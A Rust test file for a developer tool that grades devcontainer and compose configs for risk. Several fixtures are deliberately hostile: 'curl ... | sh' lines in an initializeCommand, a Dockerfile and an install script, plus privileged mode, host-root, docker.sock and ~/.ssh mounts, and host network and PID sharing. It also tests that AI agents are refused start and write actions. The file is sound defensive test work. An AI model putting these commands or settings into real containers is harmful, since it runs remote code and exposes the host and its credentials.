//! Real-world-shaped configs (modelled on the devcontainers/templates Rust, Node,
//! Python, Go and compose-with-a-database templates) and hostile ones.

use std::path::Path;

use super::config::{self, Cmd, LocalEnv, Source};
use super::plan::{self, Engine, Engines, Level};

fn project(files: &[(&str, &str)]) -> tempfile::TempDir {
    let d = tempfile::tempdir().unwrap();
    for (rel, text) in files {
        let p = d.path().join(rel);
        std::fs::create_dir_all(p.parent().unwrap()).unwrap();
        std::fs::write(p, text).unwrap();
    }
    d
}

fn engines(cli: bool, compose: bool) -> Engines {
    Engines {
        docker: Some("29.1.3".into()),
        docker_error: None,
        compose: compose.then(|| "2.39.2".into()),
        cli: cli.then(|| "devcontainer".into()),
        preference: "auto".into(),
    }
}

const RUST: &str = r#"// For format details, see https://aka.ms/devcontainer.json. For config options, see the
// README at: https://github.com/devcontainers/templates/tree/main/src/rust
{
	"name": "Rust",
	// Or use a Dockerfile or Docker Compose file. More info: https://containers.dev/guide/dockerfile
	"image": "mcr.microsoft.com/devcontainers/rust:1-1-bookworm",

	// Use 'mounts' to make the cargo cache persistent in a Docker Volume.
	"mounts": [
		{
			"source": "devcontainer-cargo-cache-${devcontainerId}",
			"target": "/usr/local/cargo",
			"type": "volume"
		}
	],

	// Features to add to the dev container. More info: https://containers.dev/features.
	"features": {
		"ghcr.io/devcontainers/features/node:1": { "version": "22" },
	},

	// Use 'forwardPorts' to make a list of ports inside the container available locally.
	"forwardPorts": [8080, 5173],
	"portsAttributes": { "8080": { "label": "api" } },

	// Use 'postCreateCommand' to run commands after the container is created.
	"postCreateCommand": "rustc --version",

	// Configure tool-specific properties.
	"customizations": { "vscode": { "extensions": ["rust-lang.rust-analyzer"] } },

	// Uncomment to connect as root instead. More info: https://aka.ms/dev-containers-non-root.
	// "remoteUser": "root"
}
"#;

#[test]
fn rust_template() {
    let d = project(&[(".devcontainer/devcontainer.json", RUST)]);
    let root = d.path();
    assert_eq!(config::discover(root), vec![".devcontainer/devcontainer.json"]);
    let c = config::load(root, ".devcontainer/devcontainer.json", LocalEnv::Keep).unwrap();
    assert_eq!(c.name.as_deref(), Some("Rust"));
    assert_eq!(c.source, Source::Image { image: "mcr.microsoft.com/devcontainers/rust:1-1-bookworm".into() });
    let base = root.file_name().unwrap().to_string_lossy().to_string();
    assert_eq!(c.workspace_folder, format!("/workspaces/{base}"));
    let wm = c.workspace_mount.as_ref().unwrap();
    assert_eq!((wm.kind.as_str(), wm.source.as_str()), ("bind", root.to_str().unwrap()));
    assert_eq!(c.mounts[0].kind, "volume");
    let id = config::devcontainer_id(root.to_str().unwrap(), root.join(".devcontainer/devcontainer.json").to_str().unwrap());
    assert_eq!(c.mounts[0].source, format!("devcontainer-cargo-cache-{id}"));
    assert_eq!(c.forward_ports.iter().map(|p| p.port).collect::<Vec<_>>(), vec![8080, 5173]);
    assert_eq!(c.forward_ports[0].label.as_deref(), Some("api"));
    assert!(c.override_command && c.update_remote_user_uid && !c.init);
    assert_eq!(c.post_create_command.as_ref().unwrap().commands[0].1, Cmd::Shell("rustc --version".into()));
    assert!(c.features.contains_key("ghcr.io/devcontainers/features/node:1"));
    assert!(c.notes.is_empty(), "{:?}", c.notes);

    // Features need the CLI.
    let text = std::fs::read(root.join(".devcontainer/devcontainer.json")).unwrap();
    let p = plan::build(root, c.clone(), &text, &engines(false, false));
    assert_eq!(p.engine, None);
    assert!(p.problems.iter().any(|x| x.contains("devcontainer CLI")), "{:?}", p.problems);
    let p = plan::build(root, c, &text, &engines(true, false));
    assert_eq!(p.engine, Some(Engine::Cli));
    assert!(p.problems.is_empty());
    assert!(p.risks.iter().all(|r| r.level != Level::Danger), "{:?}", p.risks);
    assert!(p.risks.iter().any(|r| r.item.contains("feature ghcr.io/devcontainers/features/node:1") && r.level == Level::Info));
    assert_eq!(p.ports, vec![5173, 8080]);
}

#[test]
fn node_template_with_app_port_and_array_command() {
    let d = project(&[(
        ".devcontainer.json",
        r#"{
            "name": "Node.js & TypeScript",
            "image": "mcr.microsoft.com/devcontainers/typescript-node:1-22-bookworm",
            "appPort": ["127.0.0.1:3001:3000", 9229],
            "postCreateCommand": ["yarn", "install", "--frozen-lockfile"],
            "postStartCommand": { "server": "yarn dev &", "watch": "yarn tsc -w &" },
            "remoteUser": "node",
            "waitFor": "postCreateCommand"
        }"#,
    )]);
    let root = d.path();
    let c = config::load(root, ".devcontainer.json", LocalEnv::Keep).unwrap();
    assert_eq!(c.app_ports.len(), 2);
    assert_eq!((c.app_ports[0].host_port, c.app_ports[0].port), (Some(3001), 3000));
    assert_eq!(c.remote_user.as_deref(), Some("node"));
    assert_eq!(c.post_create_command.as_ref().unwrap().commands[0].1, Cmd::Exec(vec!["yarn".into(), "install".into(), "--frozen-lockfile".into()]));
    let start = &c.post_start_command.as_ref().unwrap().commands;
    assert_eq!(start.len(), 2);
    assert_eq!(start[0].0.as_deref(), Some("server"));
    let p = plan::build(root, c, b"", &engines(false, false));
    assert_eq!(p.engine, Some(Engine::Docker));
    assert_eq!(p.hooks.iter().map(|h| h.key).collect::<Vec<_>>(), vec!["postCreateCommand", "postStartCommand"]);
    assert_eq!(p.hooks[1].commands, vec!["server: yarn dev &", "watch: yarn tsc -w &"]);
}

#[test]
fn python_dockerfile_template_with_variables() {
    let d = project(&[
        (
            ".devcontainer/devcontainer.json",
            r#"{
                "name": "Python 3",
                "build": {
                    "dockerfile": "Dockerfile",
                    "context": "..",
                    "args": { "VARIANT": "3.12-bookworm", "TOKEN": "${localEnv:WB_DEVC_TEST_TOKEN:none}" },
                    "target": "dev",
                    "cacheFrom": "ghcr.io/acme/app:cache"
                },
                "containerEnv": { "APP_HOME": "${containerWorkspaceFolder}", "BASE": "${containerWorkspaceFolderBasename}" },
                "remoteEnv": { "PATH": "${containerEnv:PATH}:${containerWorkspaceFolder}/bin", "OLD": null },
                "postCreateCommand": { "deps": "pip install --user -r requirements.txt", "hooks": "pre-commit install" },
                "workspaceFolder": "/src",
                "workspaceMount": "source=${localWorkspaceFolder},target=/src,type=bind,consistency=cached"
            }"#,
        ),
        (".devcontainer/Dockerfile", "ARG VARIANT\nFROM python:${VARIANT} AS dev\nRUN pip install ruff\n"),
    ]);
    let root = d.path();
    let c = config::load(root, ".devcontainer/devcontainer.json", LocalEnv::Keep).unwrap();
    match &c.source {
        Source::Dockerfile { dockerfile, context, args, target, cache_from, .. } => {
            assert_eq!(dockerfile, &root.join(".devcontainer/Dockerfile").display().to_string());
            assert_eq!(context, &root.display().to_string());
            assert_eq!(args["VARIANT"], "3.12-bookworm");
            // Display values keep host variables as written.
            assert_eq!(args["TOKEN"], "${localEnv:WB_DEVC_TEST_TOKEN:none}");
            assert_eq!(target.as_deref(), Some("dev"));
            assert_eq!(cache_from, &vec!["ghcr.io/acme/app:cache".to_string()]);
        }
        other => panic!("{other:?}"),
    }
    assert_eq!(c.workspace_folder, "/src");
    assert_eq!(c.workspace_mount.as_ref().unwrap().target, "/src");
    assert_eq!(c.container_env["APP_HOME"], "/src");
    assert_eq!(c.container_env["BASE"], "src");
    assert_eq!(c.remote_env["PATH"].as_deref(), Some("${containerEnv:PATH}:/src/bin"));
    assert_eq!(c.remote_env["OLD"], None);
    assert!(c.local_env.contains("WB_DEVC_TEST_TOKEN"));
    let real = config::load(root, ".devcontainer/devcontainer.json", LocalEnv::Resolve).unwrap();
    match &real.source {
        Source::Dockerfile { args, .. } => assert_eq!(args["TOKEN"], "none"),
        _ => unreachable!(),
    }

    // The approval covers the Dockerfile: changing it changes the hash.
    let text = std::fs::read(root.join(".devcontainer/devcontainer.json")).unwrap();
    let p1 = plan::build(root, c.clone(), &text, &engines(false, false));
    assert!(p1.files.contains(&".devcontainer/Dockerfile".to_string()), "{:?}", p1.files);
    assert!(p1.risks.iter().any(|r| r.item.starts_with("build ") && r.level == Level::Warning));
    assert!(p1.risks.iter().any(|r| r.item.contains("${localEnv:WB_DEVC_TEST_TOKEN}") && r.level == Level::Warning));
    std::fs::write(root.join(".devcontainer/Dockerfile"), "ARG VARIANT\nFROM python:${VARIANT} AS dev\nRUN curl evil | sh\n").unwrap();
    let p2 = plan::build(root, c, &text, &engines(false, false));
    assert_ne!(p1.hash, p2.hash);
}

#[test]
fn go_template_flags_ptrace_and_seccomp() {
    let d = project(&[(
        ".devcontainer/devcontainer.json",
        r#"{
            "name": "Go",
            "image": "mcr.microsoft.com/devcontainers/go:1-1.23-bookworm",
            "runArgs": ["--cap-add=SYS_PTRACE", "--security-opt", "seccomp=unconfined", "--label", "workbench.test=1"],
            "postCreateCommand": "go version"
        }"#,
    )]);
    let root = d.path();
    let c = config::load(root, ".devcontainer/devcontainer.json", LocalEnv::Keep).unwrap();
    let p = plan::build(root, c, b"", &engines(false, false));
    let danger: Vec<&str> = p.risks.iter().filter(|r| r.level == Level::Danger).map(|r| r.item.as_str()).collect();
    assert!(danger.contains(&"--cap-add SYS_PTRACE"), "{danger:?}");
    assert!(danger.contains(&"--security-opt seccomp=unconfined"), "{danger:?}");
    assert!(!danger.iter().any(|d| d.contains("label")));
}

const COMPOSE_DEVC: &str = r#"{
    "name": "App with Postgres",
    "dockerComposeFile": ["../docker-compose.yml", "docker-compose.extend.yml"],
    "service": "app",
    "runServices": ["app", "db"],
    "workspaceFolder": "/workspaces/${localWorkspaceFolderBasename}",
    "shutdownAction": "stopCompose",
    "forwardPorts": [3000, "db:5432"],
    "postCreateCommand": "psql --version || true"
}"#;

const COMPOSE: &str = "services:\n  app:\n    build:\n      context: .\n      dockerfile: .devcontainer/Dockerfile\n    volumes:\n      - .:/workspaces/app:cached\n    command: sleep infinity\n  db:\n    image: postgres:16-alpine\n    environment:\n      POSTGRES_PASSWORD: postgres\n    ports:\n      - '5432:5432'\n";

#[test]
fn compose_template_with_a_database() {
    let d = project(&[
        (".devcontainer/devcontainer.json", COMPOSE_DEVC),
        ("docker-compose.yml", COMPOSE),
        (".devcontainer/docker-compose.extend.yml", "services:\n  app:\n    volumes:\n      - ..:/workspaces:cached\n"),
        (".devcontainer/Dockerfile", "FROM mcr.microsoft.com/devcontainers/base:bookworm\n"),
    ]);
    let root = d.path();
    let c = config::load(root, ".devcontainer/devcontainer.json", LocalEnv::Keep).unwrap();
    match &c.source {
        Source::Compose { files, service, run_services } => {
            assert_eq!(files[0], root.join("docker-compose.yml").display().to_string());
            assert_eq!(files[1], root.join(".devcontainer/docker-compose.extend.yml").display().to_string());
            assert_eq!(service, "app");
            assert_eq!(run_services, &vec!["app".to_string(), "db".to_string()]);
        }
        other => panic!("{other:?}"),
    }
    assert!(c.workspace_mount.is_none() && !c.override_command);
    assert_eq!(c.shutdown_action, "stopCompose");
    assert_eq!(c.forward_ports[1].host.as_deref(), Some("db"));
    // Compose is built in when the plugin exists, else the CLI.
    let p = plan::build(root, c.clone(), b"", &engines(false, true));
    assert_eq!(p.engine, Some(Engine::Docker));
    assert_eq!(plan::build(root, c.clone(), b"", &engines(true, false)).engine, Some(Engine::Cli));
    assert_eq!(plan::build(root, c.clone(), b"", &engines(false, false)).engine, None);
    assert_eq!(p.ports, vec![3000], "service ports are reached on the service");
    // Its Dockerfile is covered, db's published port is flagged.
    assert!(p.files.iter().any(|f| f == ".devcontainer/Dockerfile"), "{:?}", p.files);
    assert!(p.risks.iter().any(|r| r.item.contains("db: ports: 5432:5432") && r.level == Level::Warning), "{:?}", p.risks);
    // Compose resolves relative paths in every `-f` file against the first file's folder
    // (`docker compose config` agrees): the extend file's `..` is the project's parent.
    let danger: Vec<&str> = p.risks.iter().filter(|r| r.level == Level::Danger).map(|r| r.item.as_str()).collect();
    assert_eq!(danger, vec!["app: volume ..:/workspaces:cached"], "{:#?}", p.risks);
    let parent = root.parent().unwrap().display().to_string();
    assert!(p.risks[0].message.contains(&parent), "{:?}", p.risks[0]);
}

/// Keys the web client reads are camelCase all the way down (`rename_all` on an enum
/// renames only its variants, not the fields of struct variants).
#[test]
fn plan_json_is_camel_case() {
    fn walk(v: &serde_json::Value, at: &str, bad: &mut Vec<String>) {
        match v {
            serde_json::Value::Object(m) => {
                for (k, x) in m {
                    // Maps keyed by user data.
                    if ["containerEnv", "remoteEnv", "args", "features"].contains(&at) {
                        continue;
                    }
                    if k.contains('_') {
                        bad.push(format!("{at}.{k}"));
                    }
                    walk(x, k, bad);
                }
            }
            serde_json::Value::Array(a) => a.iter().for_each(|x| walk(x, at, bad)),
            _ => {}
        }
    }
    let d = project(&[
        (".devcontainer/devcontainer.json", COMPOSE_DEVC),
        ("docker-compose.yml", COMPOSE),
        (".devcontainer/docker-compose.extend.yml", "services:\n  app:\n    environment: {A_B: c}\n"),
        (".devcontainer/Dockerfile", "FROM alpine\n"),
        (".devcontainer/py/devcontainer.json", r#"{"build": {"dockerfile": "../Dockerfile", "args": {"PY_VER": "3"}, "cacheFrom": "x"}, "containerEnv": {"MY_VAR": "1"}}"#),
    ]);
    let root = d.path();
    for (rel, key, field) in [(".devcontainer/devcontainer.json", "compose", "runServices"), (".devcontainer/py/devcontainer.json", "dockerfile", "cacheFrom")] {
        let c = config::load(root, rel, LocalEnv::Keep).unwrap();
        let v = serde_json::to_value(plan::build(root, c, b"", &engines(true, true))).unwrap();
        assert_eq!(v["config"]["source"]["kind"], key);
        assert!(v["config"]["source"][field].is_array(), "{field} missing: {}", v["config"]["source"]);
        let mut bad = vec![];
        walk(&v, "", &mut bad);
        assert!(bad.is_empty(), "snake_case keys reach the web client: {bad:?}");
    }
}

/// What compose pulls in beyond the files `dockerComposeFile` names (`extends`,
/// `include`, `env_file`, secrets) is graded and covered by the approval.
#[test]
fn compose_references_are_graded_and_covered() {
    let outside = project(&[("host.env", "TOKEN=x\n"), ("evil.yml", "services:\n  e:\n    image: x\n    pid: host\n")]);
    let o = outside.path().display().to_string();
    let d = project(&[
        (".devcontainer/devcontainer.json", r#"{"dockerComposeFile": "docker-compose.yml", "service": "app"}"#),
        (
            ".devcontainer/docker-compose.yml",
            "include:\n  - inc/extra.yml\n  - path: other.yml\n    project_directory: inc\nservices:\n  app:\n    extends: {file: base.yml, service: base}\n    volumes: [\"..:/work\"]\n    env_file: [app.env, {path: optional.env, required: false}]\n  same:\n    extends: app\n",
        ),
        (".devcontainer/base.yml", "services:\n  base:\n    extends: {file: deeper/b2.yml, service: b2}\n    image: debian:trixie-slim\n    privileged: true\n    volumes: [/:/host_root]\n"),
        (".devcontainer/deeper/b2.yml", "services:\n  b2:\n    image: x\n    cap_add: [SYS_ADMIN]\n    build: {context: ../.., dockerfile: tools/Dockerfile}\n"),
        (".devcontainer/app.env", "A=1\n"),
        (".devcontainer/inc/extra.yml", "services:\n  side:\n    image: x\n    network_mode: host\n    volumes: [\"./data:/d\"]\n"),
        (".devcontainer/other.yml", "services:\n  o:\n    image: x\n    volumes: [\"..:/p\"]\n"),
        ("tools/Dockerfile", "FROM alpine\n"),
    ]);
    let root = d.path();
    let cfg = ".devcontainer/devcontainer.json";
    let build = || {
        let c = config::load(root, cfg, LocalEnv::Keep).unwrap();
        plan::build(root, c, b"", &engines(false, true))
    };
    let p = build();
    let danger = |p: &plan::Plan, needle: &str| p.risks.iter().any(|r| r.level == Level::Danger && r.item.contains(needle));
    // Inherited through `extends: {file}`, two levels deep, and in included files.
    for needle in ["base (.devcontainer/base.yml): privileged: true", "base (.devcontainer/base.yml): volume /:/host_root", "b2 (.devcontainer/deeper/b2.yml): cap_add: SYS_ADMIN", "side (.devcontainer/inc/extra.yml): network_mode: host"] {
        assert!(danger(&p, needle), "{needle} not flagged: {:#?}", p.risks);
    }
    assert!(p.risks.iter().any(|r| r.level == Level::Danger && r.message.contains("the whole host filesystem")), "{:#?}", p.risks);
    // Paths resolve the way compose does: b2's context against its own folder (the project
    // root, inside), `other.yml`'s `..` against its project_directory `inc` (inside).
    assert!(!danger(&p, "build ../.."), "{:#?}", p.risks);
    assert!(!danger(&p, "o (.devcontainer/other.yml)"), "{:#?}", p.risks);
    // Every file compose reads is covered.
    for f in [".devcontainer/base.yml", ".devcontainer/deeper/b2.yml", ".devcontainer/inc/extra.yml", ".devcontainer/other.yml", ".devcontainer/app.env", "tools/Dockerfile"] {
        assert!(p.files.iter().any(|x| x == f), "{f} not covered: {:?}", p.files);
    }
    // A change to any of them asks again.
    for (f, text) in [(".devcontainer/base.yml", "services:\n  base:\n    image: x\n"), (".devcontainer/app.env", "A=2\n"), (".devcontainer/inc/extra.yml", "services: {}\n")] {
        let before = build().hash;
        std::fs::write(root.join(f), text).unwrap();
        assert_ne!(build().hash, before, "{f}");
    }

    // Files outside the project, and ones only known when compose runs, are dangers.
    std::fs::write(
        root.join(".devcontainer/docker-compose.yml"),
        format!(
            "include: [{o}/evil.yml]\nservices:\n  app:\n    image: x\n    env_file: {o}/host.env\n  v:\n    extends: {{file: \"${{BASE}}.yml\", service: b}}\n  r:\n    extends: {{file: ~/base.yml, service: b}}\nsecrets:\n  s:\n    file: /etc/hostname\n"
        ),
    )
    .unwrap();
    let p = build();
    assert!(p.risks.iter().any(|r| r.level == Level::Danger && r.item.ends_with("evil.yml") && r.message.contains("outside the project")), "{:#?}", p.risks);
    assert!(p.risks.iter().any(|r| r.level == Level::Danger && r.item.contains("pid: host")), "outside files are still read for their risks: {:#?}", p.risks);
    assert!(danger(&p, "app: env_file"), "{:#?}", p.risks);
    assert!(danger(&p, "v: extends ${BASE}.yml"), "{:#?}", p.risks);
    assert!(danger(&p, "r: extends ~/base.yml"), "{:#?}", p.risks);
    assert!(danger(&p, "secrets: s: file /etc/hostname"), "{:#?}", p.risks);
}

/// `include` and `extends` cycles end; nesting past the limit is a danger, not a hang.
#[test]
fn compose_reference_cycles_and_depth_end() {
    let mut files: Vec<(String, String)> = vec![
        (".devcontainer/devcontainer.json".into(), r#"{"dockerComposeFile": ["a.yml", "chain0.yml"], "service": "app"}"#.into()),
        (".devcontainer/a.yml".into(), "include: [b.yml]\nservices:\n  app:\n    extends: {file: b.yml, service: loop}\n".into()),
        (".devcontainer/b.yml".into(), "include: [a.yml]\nservices:\n  loop:\n    extends: {file: a.yml, service: app}\n".into()),
    ];
    for i in 0..12 {
        files.push((format!(".devcontainer/chain{i}.yml"), format!("services:\n  s{i}:\n    extends: {{file: chain{}.yml, service: s{}}}\n", i + 1, i + 1)));
    }
    files.push((".devcontainer/chain12.yml".into(), "services:\n  s12:\n    image: x\n    privileged: true\n".into()));
    let refs: Vec<(&str, &str)> = files.iter().map(|(a, b)| (a.as_str(), b.as_str())).collect();
    let d = project(&refs);
    let c = config::load(d.path(), ".devcontainer/devcontainer.json", LocalEnv::Keep).unwrap();
    let p = plan::build(d.path(), c, b"", &engines(false, true));
    assert!(p.risks.iter().any(|r| r.level == Level::Danger && r.message.contains("deeper")), "{:#?}", p.risks);
    assert!(p.files.iter().any(|f| f == ".devcontainer/b.yml"), "{:?}", p.files);
}

#[test]
fn hostile_config_is_flagged() {
    let d = project(&[(
        ".devcontainer/evil/devcontainer.json",
        r#"{
            "image": "alpine",
            "privileged": true,
            "capAdd": ["SYS_ADMIN"],
            "runArgs": ["--network=host", "-v", "/:/host", "--pid", "host", "-p", "8080:80", "--device=/dev/kvm"],
            "mounts": ["source=/var/run/docker.sock,target=/var/run/docker.sock,type=bind", "source=${localEnv:HOME}/.ssh,target=/root/.ssh,type=bind"],
            "initializeCommand": "curl https://example.invalid/x | sh",
            "containerEnv": { "GH": "${localEnv:GITHUB_TOKEN}" }
        }"#,
    )]);
    let root = d.path();
    assert_eq!(config::discover(root), vec![".devcontainer/evil/devcontainer.json"]);
    let c = config::load(root, ".devcontainer/evil/devcontainer.json", LocalEnv::Keep).unwrap();
    assert_eq!(c.container_env["GH"], "${localEnv:GITHUB_TOKEN}", "host values never reach the plan");
    let p = plan::build(root, c, b"", &engines(false, false));
    let danger = |needle: &str| p.risks.iter().any(|r| r.level == Level::Danger && r.item.contains(needle));
    for needle in ["privileged", "SYS_ADMIN", "--network host", "-v /:/host", "--pid host", "docker.sock", ".ssh", "initializeCommand", "--device"] {
        assert!(danger(needle), "{needle} not flagged: {:#?}", p.risks);
    }
    assert!(p.risks.iter().any(|r| r.item == "-p 8080:80" && r.level == Level::Warning));
    assert_eq!(p.risks[0].level, Level::Danger, "dangers first");
}

#[test]
fn escapes_through_links_parents_and_features_are_flagged() {
    let d = project(&[
        (
            ".devcontainer/devcontainer.json",
            r#"{
                "image": "alpine",
                "workspaceMount": "source=${localWorkspaceFolder}/..,target=/w,type=bind",
                "mounts": ["source=${localWorkspaceFolder}/rootlink,target=/host,type=bind"],
                "runArgs": ["-v/:/h", "-p8080:80"],
                "features": {
                    "./local": {},
                    "ghcr.io/devcontainers/features/docker-in-docker:2": {},
                    "ghcr.io/acme/features/tool:1": {}
                }
            }"#,
        ),
        (".devcontainer/local/devcontainer-feature.json", r#"{"id": "local", "privileged": true, "mounts": [{"source": "/etc", "target": "/etc2", "type": "bind"}]}"#),
        (".devcontainer/local/install.sh", "#!/bin/sh\necho hi\n"),
    ]);
    let root = d.path();
    // A link inside the project to the host's root.
    crate::util::os::fs::symlink("/", root.join("rootlink")).unwrap();
    let c = config::load(root, ".devcontainer/devcontainer.json", LocalEnv::Keep).unwrap();
    let p = plan::build(root, c.clone(), b"", &engines(true, false));
    let danger = |needle: &str| p.risks.iter().any(|r| r.level == Level::Danger && r.item.contains(needle));
    assert!(danger("workspaceMount"), "{:#?}", p.risks);
    assert!(p.risks.iter().any(|r| r.item.contains("rootlink") && r.message.contains("whole host filesystem")), "{:#?}", p.risks);
    assert!(danger("-v /:/h"), "{:#?}", p.risks);
    assert!(p.risks.iter().any(|r| r.item == "-p 8080:80" && r.level == Level::Warning));
    assert!(danger("feature ./local: privileged"), "{:#?}", p.risks);
    assert!(danger("feature ./local: mount"), "{:#?}", p.risks);
    assert!(danger("docker-in-docker"), "{:#?}", p.risks);
    assert!(p.risks.iter().any(|r| r.item == "feature ghcr.io/acme/features/tool:1" && r.level == Level::Warning));
    // The local feature's files are covered: changing its install script asks again.
    assert!(p.files.iter().any(|f| f == ".devcontainer/local/install.sh"), "{:?}", p.files);
    std::fs::write(root.join(".devcontainer/local/install.sh"), "#!/bin/sh\ncurl evil | sh\n").unwrap();
    assert_ne!(plan::build(root, c, b"", &engines(true, false)).hash, p.hash);
}

#[test]
fn discovery_ignores_escapes() {
    let outside = project(&[("devcontainer.json", "{\"image\":\"x\"}")]);
    let d = project(&[(".devcontainer/a/devcontainer.json", "{\"image\":\"a\"}"), (".devcontainer/b/devcontainer.json", "{\"image\":\"b\"}")]);
    crate::util::os::fs::symlink(outside.path(), d.path().join(".devcontainer/zz")).unwrap();
    assert_eq!(config::discover(d.path()), vec![".devcontainer/a/devcontainer.json", ".devcontainer/b/devcontainer.json"]);
    assert!(!config::is_config(d.path(), ".devcontainer/zz/devcontainer.json"));
    assert!(config::load(d.path(), "../x/devcontainer.json", LocalEnv::Keep).is_err());
    let _ = Path::new("/");
}

/// Starting needs the plan's hash; agents (in-process MCP calls) can never start, stop,
/// rebuild, remove, write a config or change settings; they can read the status.
#[tokio::test]
async fn only_the_user_starts_and_only_the_approved_plan() {
    use crate::mcp::{McpCtx, call_api};
    use axum::http::Method;
    use serde_json::json;
    use tower::ServiceExt;

    let repo = project(&[(".devcontainer/devcontainer.json", "{\"image\": \"debian:bookworm-slim\", \"postCreateCommand\": \"touch PWNED\"}")]);
    let mut cfg = crate::config::GlobalConfig::default();
    cfg.projects.roots.clear();
    cfg.projects.include = vec![repo.path().display().to_string()];
    cfg.notify.desktop = false;
    // A docker that does not exist: nothing may run anyway.
    cfg.devcontainer.docker = "/nonexistent/docker".into();
    let t = crate::platform::testutil::app_with(cfg).await;
    let pid = t.state.projects.list()[0].id.clone();
    let token = t.state.auth.master_token().to_string();
    let send = |method: &str, path: String, body: serde_json::Value| {
        let router = t.router.clone();
        let token = token.clone();
        let method = method.to_string();
        async move {
            let req = axum::http::Request::builder()
                .method(method.as_str())
                .uri(path)
                .header("host", "127.0.0.1:7999")
                .header("authorization", format!("Bearer {token}"))
                .header("content-type", "application/json")
                .body(axum::body::Body::from(body.to_string()))
                .unwrap();
            let resp = router.oneshot(req).await.unwrap();
            let status = resp.status().as_u16();
            let bytes = axum::body::to_bytes(resp.into_body(), 1 << 20).await.unwrap();
            (status, serde_json::from_slice::<serde_json::Value>(&bytes).unwrap_or_default())
        }
    };
    let base = format!("/api/projects/{pid}/devcontainer");

    let (s, v) = send("GET", base.clone(), json!(null)).await;
    assert_eq!(s, 200);
    assert_eq!(v["configs"], json!([".devcontainer/devcontainer.json"]));
    assert_eq!(v["approved"], false);
    let hash = v["plan"]["hash"].as_str().unwrap().to_string();

    // Without the hash, or with another one: the plan to approve.
    for body in [json!({}), json!({ "approve": "0".repeat(64) })] {
        let (s, v) = send("POST", format!("{base}/start"), body).await;
        assert_eq!(s, 409);
        assert_eq!(v["error"]["code"], "approval_required");
        assert_eq!(v["plan"]["hash"], hash.as_str());
    }
    // With it: docker is missing here, so it cannot start (and nothing ran).
    let (s, v) = send("POST", format!("{base}/start"), json!({ "approve": hash })).await;
    assert_eq!((s, v["error"]["code"].as_str()), (409, Some("not_startable")), "{v}");
    assert!(!repo.path().join("PWNED").exists());

    // An agent (in-process MCP call) is refused every write, even with the right hash.
    let agent = McpCtx { terminal_id: Some("t1".into()), project_id: Some(pid.clone()) };
    for (path, body) in [
        (format!("{base}/start"), json!({ "approve": hash })),
        (format!("{base}/rebuild"), json!({ "approve": hash })),
        (format!("{base}/stop"), json!({})),
        (format!("{base}/remove"), json!({ "confirm": true })),
        (format!("{base}/scaffold"), json!({ "path": ".devcontainer/x/devcontainer.json", "content": "{}" })),
    ] {
        let e = call_api(&t.state, Method::POST, &path, Some(body), &agent).await.unwrap_err();
        assert_eq!(e.status.as_u16(), 403, "{path}: {e}");
    }
    let e = call_api(&t.state, Method::PUT, &format!("{base}/settings"), Some(json!({ "useContainer": true })), &agent).await.unwrap_err();
    assert_eq!(e.status.as_u16(), 403);
    assert!(call_api(&t.state, Method::GET, &base, None, &agent).await.is_ok());
    assert!(!repo.path().join(".devcontainer/x").exists());
    // The MCP tool reads the status without the approval hash.
    let tool = super::mcp_tools().into_iter().find(|x| x.name == "devcontainer_status").unwrap();
    let out = (tool.handler)(t.state.clone(), agent.clone(), json!({})).await.unwrap();
    let crate::mcp::ToolOutput::Json(v) = out else { panic!("json expected") };
    assert!(v["plan"].get("hash").is_none());
    assert_eq!(v["state"], "none");
}

#[test]
fn a_changed_config_needs_approval_again() {
    let d = project(&[(".devcontainer/devcontainer.json", "{\"image\": \"debian:bookworm-slim\"}")]);
    let root = d.path();
    let load = || {
        let text = std::fs::read(root.join(".devcontainer/devcontainer.json")).unwrap();
        let c = config::load(root, ".devcontainer/devcontainer.json", LocalEnv::Keep).unwrap();
        plan::build(root, c, &text, &engines(false, false)).hash
    };
    let a = load();
    assert_eq!(a, load());
    std::fs::write(root.join(".devcontainer/devcontainer.json"), "{\"image\": \"debian:bookworm-slim\", \"runArgs\": [\"--privileged\"]}").unwrap();
    assert_ne!(a, load());
}
